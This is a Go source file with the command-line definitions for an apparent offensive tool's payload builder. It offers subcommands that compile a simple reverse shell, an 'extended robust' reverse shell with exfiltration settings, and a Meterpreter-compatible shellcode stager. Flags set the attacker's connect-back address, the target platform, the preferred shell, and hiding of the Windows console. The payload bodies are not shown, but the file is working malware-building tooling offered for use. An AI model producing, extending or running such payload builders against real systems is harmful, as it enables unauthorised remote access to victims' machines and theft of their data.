package cmd

import (
	"fmt"
	"runtime"
	"time"

	"github.com/spf13/cobra"
)

type BuildOpts struct {
	Arch         string
	OS           string
	Output       string
	NoWindowsGui bool
}

var buildOpts BuildOpts

var payloadVars struct {
	address        string
	net            string
	verbose        bool
	exfilCfg       string
	exfilTimeout   time.Duration
	preferredShell string
}

var payloadCmd = &cobra.Command{
	Use:           "payload",
	Short:         "build a payload",
	SilenceErrors: true,
}

var reverseShellCmd = &cobra.Command{
	Use:   "rsh",
	Short: "simple reverse shell",
	Run: func(cmd *cobra.Command, args []string) {
		verbose := "false"
		if payloadVars.verbose {
			verbose = "true"
		}

		err := build("rsh", injectedVariables{
			"address": payloadVars.address,
			"network": payloadVars.net,
			"verbose": verbose,
			"shell":   payloadVars.preferredShell,
		}, buildOpts)
		if err != nil {
			fmt.Println(err)
		}
	},
}

var extendedReverseShellCmd = &cobra.Command{
	Use:   "xrsh",
	Short: "extended robust reverse shell",
	Run: func(cmd *cobra.Command, args []string) {
		err := build("xrsh", injectedVariables{
			"address":      payloadVars.address,
			"network":      payloadVars.net,
			"exfilCfg":     payloadVars.exfilCfg,
			"exfilTimeout": payloadVars.exfilTimeout.String(),
			"shell":        payloadVars.preferredShell,
		}, buildOpts)
		if err != nil {
			fmt.Println(err)
		}
	},
}

var stagerCmd = &cobra.Command{
	Use:   "stager",
	Short: "meterpreter/reverse_tcp compatible shellcode stager",
	Run: func(cmd *cobra.Command, args []string) {
		err := build("stager", injectedVariables{
			"address":      payloadVars.address,
			"network":      payloadVars.net,
			"exfilCfg":     payloadVars.exfilCfg,
			"exfilTimeout": payloadVars.exfilTimeout.String(),
		}, buildOpts)
		if err != nil {
			fmt.Println(err)
		}
	},
}

func init() {
	payloadCmd.PersistentFlags().StringVarP(&payloadVars.address, "destination", "d", "",
		"connect-back destination, like LHOST (host:port)")
	payloadCmd.PersistentFlags().StringVarP(&payloadVars.net, "network", "n", "tcp", "dial network")
	payloadCmd.PersistentFlags().StringVar(&buildOpts.Arch, "arch", runtime.GOARCH, "target architecture")
	payloadCmd.PersistentFlags().StringVar(&buildOpts.OS, "os", runtime.GOOS, "target operating system")
	payloadCmd.PersistentFlags().StringVarP(&buildOpts.Output, "output", "o", "", "target operating system")
	payloadCmd.PersistentFlags().BoolVar(&buildOpts.NoWindowsGui, "nowindowsgui", false,
		"don't use -H=windowsgui")

	_ = payloadCmd.MarkPersistentFlagRequired("destination")

	reverseShellCmd.PersistentFlags().BoolVar(&payloadVars.verbose, "verbose", false, "print errors to stderr")
	reverseShellCmd.PersistentFlags().StringVar(&payloadVars.preferredShell, "shell", "", "preferred shell")

	extendedReverseShellCmd.PersistentFlags().StringVarP(&payloadVars.exfilCfg, "exfil", "e", "",
		"log exfil configuration")
	extendedReverseShellCmd.PersistentFlags().DurationVar(&payloadVars.exfilTimeout, "timeout", 3*time.Second,
		"exfil timeout")
	extendedReverseShellCmd.PersistentFlags().StringVar(&payloadVars.preferredShell, "shell", "",
		"preferred shell")

	stagerCmd.PersistentFlags().StringVarP(&payloadVars.exfilCfg, "exfil", "e", "", "log exfil configuration")
	stagerCmd.PersistentFlags().DurationVar(&payloadVars.exfilTimeout, "timeout", 3*time.Second,
		"exfil timeout")

	payloadCmd.AddCommand(reverseShellCmd)
	payloadCmd.AddCommand(extendedReverseShellCmd)
	payloadCmd.AddCommand(stagerCmd)
}
